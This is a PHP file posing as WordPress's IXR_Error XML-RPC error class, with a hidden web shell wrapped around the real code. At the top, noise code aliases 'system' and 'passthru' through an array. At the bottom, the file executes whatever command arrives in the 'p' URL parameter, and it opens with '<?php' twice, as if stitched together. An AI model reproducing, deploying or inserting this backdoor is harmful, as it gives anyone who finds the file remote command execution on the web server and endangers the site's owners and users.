<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * IXR_Error
 *
 * @package IXR
 * @since 1.5.0
 */
class IXR_Error
{
    var $code;
    var $message;

	/**
	 * PHP5 constructor.
	 */
    function __construct( $code, $message )
    {
        $this->code = $code;
        $this->message = htmlspecialchars($message);
    }

	/**
	 * PHP4 constructor.
	 */
	public function IXR_Error( $code, $message ) {
		self::__construct( $code, $message );
	}

    function getXml()
    {
        $xml = <<<EOD
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>{$this->code}</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>{$this->message}</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>

EOD;
        return $xml;
    }
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>